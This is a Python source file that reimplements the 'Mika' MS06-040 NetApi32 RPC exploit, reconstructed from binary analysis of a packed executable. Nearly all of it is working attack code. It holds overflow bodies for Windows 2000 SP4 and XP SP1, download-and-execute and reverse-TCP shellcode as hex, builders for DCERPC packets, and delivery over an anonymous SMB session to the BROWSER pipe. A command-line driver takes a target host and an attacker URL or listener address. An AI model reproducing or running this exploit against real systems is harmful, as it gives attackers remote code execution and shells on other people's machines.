#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
netapi32_exp.py -- Python rewrite of the Mika MS06-040 (NetApi32) RPC exploit.

Binary analysis (via IDA Pro) of `ms06040rpc.exe`:

    ms06040rpc  is a memory-packed PE (custom .nsp0/.nsp1/.nsp2 loader).  Once
    unpacked the OEP (0x401000) is the classic `Mika` MS06-040 exploit:

        start        (0x401000)   builds + sends a DCERPC BIND  for the Browser
                                  RPC interface, then hands off.
        sub_401470   (0x401470)   main(): parses the CLI, opens the remote
                                  "\\<host>\\pipe\\BROWSER" named pipe and calls
                                  sub_4010C0 with the exploit payload.
        sub_4010C0   (0x4010C0)   builds a DCERPC REQUEST (opnum 31 =
                                  NetApi32 NetpwPathCanonicalize) carrying the
                                  OS-specific overflow body + XOR-encoded
                                  shellcode and sends it.

  Exploit targets `netapi32!NetpwPathCanonicalize` via the remote BROWSER
  named pipe, for:
      os type 1  ->  Windows 2000 SP4 (payload body size 1152 / alloc 1128)
      os type 2  ->  Windows XP  SP1 (payload body size 796  / alloc 772, sent twice)

  Two shellcodes are selectable by argument count:
      download-exec   ("<host>  <url> <ostype>")   embeds a URL and XOR-encodes
                      it (sub_401360), prompting the victim to fetch & run it.
      reverse-shell   ("<host> <ip> <port> <ostype>") patches LPORT/LHOST into
                      the msfvenom-style reverse_tcp stage (sub_4010C0).

  The DCERPC request body is simply a reconstructed NetpwPathCanonicalize stub;
  the exact payload bytes are lifted verbatim from the unpacked image.  Sending
  is done over the remote named pipe, which this port drives through impacket's
  SMBConnection (the C original used WNetAddConnection2A + CreateFileW on
  "\\host\\pipe\\BROWSER").
"""

import socket
import struct
import sys

try:
    from impacket.smbconnection import SMBConnection, SessionError as SMBSessionError
    HAVE_IMPACKET = True
except Exception:                      # pragma: no cover
    HAVE_IMPACKET = False
    SMBSessionError = Exception


# ---------------------------------------------------------------------------
# Recovered literal payloads (extracted from the unpacked image).
# ---------------------------------------------------------------------------
# DCERPC/BROWSER interface UUID bound before the request is sent.
BROWSER_UUID = "4b324fc8-1670-01d3-1278-5a47bf6ee188"

# OS-specific NetApi32 request bodies (shellcode slot starts at offset 56).
WIN2000_BODY = bytes.fromhex("756b225601000000000000000100000000001bf71502000000000000150200004af942f5934a933793f5929b93274f474937d6fcfd274a9090409f9f9b3ffdf9434b9240434e964990933f919896f84a993f43f5409f479b98419f4b3f40424a92904f9246964041fd413f96434e49434f91fc4f933f27969137979898984af5919693934797499697f5d64791919042489842493f9390934e4747999227fdfdfc4b914b434bd6463792f5464f999fd697f59bf843f8974f3f4127969227934b989b4847f89348fc98f5914f9f424a484a974e914990f8914f929692d647989040f5fc46f546f9d64ffc9891419148fc984949fc41374646f5903f484a40374741f593f84092494a37fdf8939b46474792929293999393fd3f42479096924f4a4a9393463ff9fd909b97479b9149d697914b402746429148974e93909649f5f9434b41f548fd4b4143404bf997fdfcf9fcf9969f99d6414ad6274a992748f5f99037429140fc4b4196909ffc47f527f59247964a4f9246984b923f41f846d6fc272749499f274f9246d641f9373797fc91f5464748fd96f590904b9bfdf8f84a274691999393d697f9439bfcd6fd41d6d69f974f499bd6423740f89bfc90fd42d64149973f9993f8492797d69247934e9f37d6fdd64b4246914a9f9149904e49489827d64690433ff9f8483f404b9f379bd6fd40d69947469790494efd933f3f4ad64096d6f927fd4f4390f842d6924396914a464ffd92fc403797f5f597924b99f837f5409840fc42f94b99434097484e4941f99049fc47fd9348424a40d69637274349924f4193d64e9f43984ed6963f9f4b4a994737fcf9d699f8274b4790f9494bd6fd99904e98fd4b96434f3f4a90f94296404e3799484049279792d637933746fd96429bf89b4b9740914b93d64f429f4b4ef5fd9199fc9992273ff949fcf5f5373fd6924bf93f974b9b4f4947473ffd98d6374b4a9190273f97f9d6d6904040434340f8909692489627f99996964f964b4f98f9419399d69b974e4efd46379f40fd97479b4143424e404e3f37979f37fd92989091fd90f8fc939691414f9f4692274f3f4037914e4ff5993f4a93999ff59046934327274f4e91426a3559d9eed97424f45b817313d3457da283ebfce2f45281824d2cba395e3b017da2d3ce389e583978dad2aaf6edcbce2282d2ae3429e7ce7c4ce285e40e578509a5128f70a311ae8999876179d736ce2286d2ae1b29df0ef6fdcf449629cfce7c495a1959a61074bdc658054d27133d71299349f6d2cfe8f6cadbae742953f57da2d3ce159e8c748bc285cc8521133e2dca3c8b9dc2bbdd8328dd128245b028198cb63d1882fc265dccb6315dd7a0200f82e2774e82e2774e82fc0439e6f3635b82bd200982bf2a1ec3bf220fcda6355de3b72814ccba3609d0b23112d0a0654c90e06552e397017da204080200040802000408020004080200040802000408020004080200040802000408020004080200040802000408020004080200040802000408020004080200000093c8f5000000020000000000000002000000eb0200002800000000000000")
WINXP_BODY   = bytes.fromhex("0e4c9fe60100000000000000010000000000c852630100000000000063010000fd4e4a48434f479993f83f4098929f919343f5904ed69227914899f549434e93494390984a984e4f2746f996d69040fcfc9391f84f2798424f964841904a429ffd989191464141923ffc99934e96409198439693f5d64f9b279f9bfd993ffd4fd6914a9698fdf99b3741fc9f424a40f8434a98419191f9d6d69b49423f90fc9b4b92fc3796fc4198fc4f4e91974a9249929f91414a41982798d69148fcfcf54b9f9ffcd6f8496a3559d9eed97424f45b81731360d221ae83ebfce2f4e116de419f2d6552889621ae60596492ebae24d6613daae178597e8e61396825545920405112b802e41255a9a1182cafa239d59534f625db85597e8a613947256c99aaf17cd3ca257c592045e98e05aaa3e3e1caeb92112ba0aa2d2520deaade7c7faac668392825e06221ae605949923fe3d7ce365bd92da0a971c68f1cc1ce084adf246e85de4903bf458005aa448e4fb101c005a601db13b7538e51e0128e51e0128e4f9365ea40f4078e0eb7558e0cbd42cf0cb553c115a201ef04bf48c009a155dc01a64edc13f2109c53f20eef249621ae3176574e6559454d697349397632395274555a576c6e6b4b5164394e5532733171446f554d446f703358477035347a6e614c6d4e39305039474d645046634b61746362384469767639496151415a37366e6a6f6d7a6e464346794e6e4c4d53487a4677784763525a35306f423342573856597a476b78626b766879634b684269465354394a6e387475727850696d61577062763638747769626b4a59385275636c5a627732516f4b754c6d32486c504f3753487434654f35586e475369564862365278357a614b376f6449314b6f3831354c33610a080200776d4f36487a4779040802007a373843475059783431796855304c6b61436b70676870494d5574557345745a040802005a7a446856754e6c040802007a526653665a544975566a63755a66554c6d644d45364262743436465458664600004307c700000001000000000000000100000000008dc16100000000000000")

# Shellcode templates.
#  download-exec : self-decoding stub (XOR key at +13, len at +8); URL appended
#                  at +0x127 and the whole tail XOR-encoded.
DOWNLOAD_TEMPL = bytes.fromhex("eb105b4b33c966b9eeee80340bffe2faeb05e8ebffffffe9f20000005f64a1300000008b400c8b701cad8b68088bf76a0459e892000000e2f9686f6e00006875726c6d54ff168be8e87c00000083ec208bdc6a2053ff5604c704035c612e65c74403047865000033c05050535750ff56108bec81edbb000000895da08b5e08895da48be581ecdd0000008d85a8ffffff6a4459c6000040e2fac745a8440000008bf48d45ec508d4da8516a006a006a206a006a006a006a008b55a052ff55a43bf4e8a4070000ff560c51568b753c8b742e7803f5568b762003f533c94941ad03c533db0fbe103ad67408c1cb0d03da40ebf13b1f75e75e8b5e2403dd668b0c4b8b5e1c03dd8b048b03c5ab5e59c3e809ffffff8e4e0eecc179e5b872feb316efcee060361a2f7000")
#  reverse_tcp   : msfvenom-style stage; LHOST patched at +0xA0, LPORT at +0xA6.
REVERSE_TEMPL  = bytes.fromhex("fc6aeb4de8f9ffffff608b6c24248b453c8b7c057801ef8b4f188b5f2001eb498b348b01ee31c099ac84c07407c1ca0d01c2ebf43b54242875e58b5f2401eb668b0c4b8b5f1c01eb032c8b896c241c61c331db648b43308b400c8b701cad8b40085e688e4e0eec50ffd6665366683332687773325f54ffd068cbedfc3b50ffd65f89e56681ed0802556a02ffd068d909f5ad57ffd65353535343534353ffd068ca6e840b666810e1665389e19568ecf9aa6057ffd66a105155ffd0666a646668636d6a505929cc89e76a4489e231c0f3aa9589fdfe422dfe422c8d7a38ababab6872feb316ff7528ffd65b57525151516a0151515551ffd068add905ce53ffd66affff37ffd068e779c679ff7504ffd6ff77fcffd068efcee06053ffd6ffd000")

# Bytes an XOR-encoded byte must never collide with (avoid HTTP/pipe chars).
BAD_XOR = frozenset((0x26, 0x3d, 0x3f, 0x40, 0x00, 0x0d, 0x0a, 0x5c, 0x5f, 0x2e, 0x2f))

# NetApi32 NetpwPathCanonicalize -> RPC opnum 31.
OPNUM = 0x1F


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# DCERPC frame builders.
# ---------------------------------------------------------------------------
def build_bind():
    """72-byte DCERPC BIND to the BROWSER interface (NDR transfer syntax)."""
    # little-endian mixed GUID encoding of "4b324fc8-1670-01d3-1278-5a47bf6ee188"
    abstract = bytes.fromhex("c84f324b7016d30112785a47bf6ee188") + bytes.fromhex("01000000")
    transfer = bytes.fromhex("045d888aeb1cc9119fe808002b104860") + bytes.fromhex("02000000")
    ctx_item = struct.pack("<HBB", 0, 1, 0) + abstract + transfer
    bind_pdu = struct.pack("<HHLBBH", 0x10B8, 0x10B8, 0, 1, 0, 0) + ctx_item
    header = struct.pack("<BBBBIHHI", 5, 0, 0x0B, 0x03, 0x10,
                         16 + len(bind_pdu), 0, 1)
    return header + bind_pdu


def build_request(frag_len, alloc_hint, opnum=OPNUM):
    """24-byte DCERPC REQUEST header for NetpwPathCanonicalize."""
    return struct.pack("<4BIHHIIHH",
                       5, 0, 0, 0x03, 0x10,
                       frag_len, 0, 1, alloc_hint, 0, opnum)


def _assemble_packet(shellcode, body):
    """Concatenate the 24-byte DCERPC REQUEST header + body, then splice the
    XOR-encoded shellcode into the NetApi32 stub's code slot (offset 56)."""
    frag_len = 24 + len(body)                 # full on-wire packet length
    pkt = bytearray(build_request(frag_len, len(body)) + body)
    pkt[56:56 + len(shellcode)] = shellcode
    return bytes(pkt)


# ---------------------------------------------------------------------------
# Shellcode builders.
# ---------------------------------------------------------------------------
def build_reverse_shellcode(addr, port):
    """Patch LHOST/LPORT into the reverse_tcp stage (offsets recovered from the
    unpacked globals dword_4071F8 / word_4071FE inside the template)."""
    buf = bytearray(REVERSE_TEMPL)
    struct.pack_into("<4s", buf, 0xA0, socket.inet_aton(addr))
    struct.pack_into("<H",  buf, 0xA6, socket.htons(port))
    return bytes(buf)


def _find_xor_byte(buf, size):
    v3 = 0xFF
    while True:
        if all((v3 ^ buf[i]) not in BAD_XOR for i in range(23, size)):
            return v3
        v3 -= 1
        if not v3:
            return None


def build_download_shellcode(url):
    """Reconstruct sub_401360: URL-stage download-exec shellcode, XOR-encoded."""
    raw_url = url.encode("latin-1", "replace")
    buf = bytearray(0x400)
    buf[:len(DOWNLOAD_TEMPL)] = DOWNLOAD_TEMPL
    size = len(raw_url) + 298
    buf[0x127:0x127 + len(raw_url)] = raw_url
    xor = _find_xor_byte(buf, size)
    if xor is None:
        _log("[-] No xor byte found!")
        return None
    _log("[+] Find XOR Byte: 0x%02X", xor)
    for i in range(23, size):
        buf[i] ^= xor
    struct.pack_into("<H", buf, 0x08, size)   # decoder loop count  (word_4085F4)
    buf[0x0D] = xor                          # decoder XOR key     (byte_4085F9)
    return bytes(buf[:size])


# ---------------------------------------------------------------------------
# Named-pipe transport (impacket SMBConnection).
# ---------------------------------------------------------------------------
def _open_pipe(host):
    if not HAVE_IMPACKET:
        raise RuntimeError("This subcommand requires the 'impacket' library: "
                           "pip install impacket")
    conn = SMBConnection(remoteName=host, remoteHost=host)
    conn.login("", "")                      # anonymous IPC$ session
    tid = conn.connectTree("IPC$")
    fid = conn.openFile(tid, r"\BROWSER",
                        desiredAccess=0x80000000 | 0x40000000,   # GENERIC_RW
                        createDisposition=3)                      # OPEN_EXISTING
    return conn, tid, fid


def _send_recv(conn, tid, fid, data):
    """Write `data` to the pipe and read the DCERPC reply (dword_406060)."""
    conn.writeFile(tid, fid, data)
    try:
        return conn.readFile(tid, fid, 0x1000)
    except SMBSessionError:
        return b""


# ---------------------------------------------------------------------------
# run_function -- what the original main() feeds.
# ---------------------------------------------------------------------------
def run_function(host, mode="download", url=None, raddr=None, rport=None,
                 os_type=1):
    """Exploit MS06-040 against `host` over the BROWSER named pipe."""
    _log("^_^Mika is telling you:don't play with fire!^o^")
    mode = (mode or "download").lower()

    # pick the shellcode for the requested mode
    if mode == "reverse":
        shellcode = build_reverse_shellcode(raddr, rport)
    elif mode == "download":
        if not url:
            _log("[-] download mode requires a URL")
            return 1
        shellcode = build_download_shellcode(url)
    else:
        _log("[-] unknown payload mode: %s", mode)
        return 1
    if not shellcode:
        return 1

    conn = tid = fid = None
    try:
        conn, tid, fid = _open_pipe(host)

        # 1) bind the BROWSER RPC interface (start / sub_401470)
        _send_recv(conn, tid, fid, build_bind())

        # 2) send the NetpwPathCanonicalize overflow request(s)
        if os_type == 1:                     # Windows 2000 SP4
            _log("Sending payload...finish")
            _send_recv(conn, tid, fid,
                       _assemble_packet(shellcode, WIN2000_BODY))
        else:                                # Windows XP SP1 / Server 2003
            _log("Sending payload1...finish")
            _send_recv(conn, tid, fid,
                       _assemble_packet(shellcode, WINXP_BODY))
            _log("Sending payload2...finish")
            _send_recv(conn, tid, fid,
                       _assemble_packet(shellcode, WINXP_BODY))
        return 0
    except Exception as e:
        _log("[-] %s", e)
        return 1
    finally:
        if conn is not None:
            try:
                conn.logoff()
            except Exception:
                pass


def main():
    """CLI driver mirroring the original `sub_401470` argument handling.

      netapi32-exp <host> <download url> <os type>
      netapi32-exp <host> <reverse addr> <reverse port> <os type>
    """
    args = sys.argv[1:]
    if len(args) < 3:
        _log(_usage())
        return 1
    host = args[0]
    os_type = 1
    mode = "reverse" if len(args) >= 4 else "download"
    if mode == "download":
        url = args[1]
        try:
            os_type = int(args[2])
        except ValueError:
            os_type = 1
        return run_function(host, mode="download", url=url, os_type=os_type)
    else:
        raddr = args[1]
        try:
            rport = int(args[2])
        except ValueError:
            rport = 80
        try:
            os_type = int(args[3])
        except ValueError:
            os_type = 1
        return run_function(host, mode="reverse", raddr=raddr, rport=rport,
                            os_type=os_type)


def _usage():
    return ("Usage:\n"
            "\t%s <host> <download url> <os type>\n"
            "\t%s <host> <reverse addr> <reverse port> <os type>\n"
            "\t<os type> 1: win2000sp4  2: winxpsp1\n") % (sys.argv[0], sys.argv[0])


if __name__ == "__main__":
    sys.exit(main())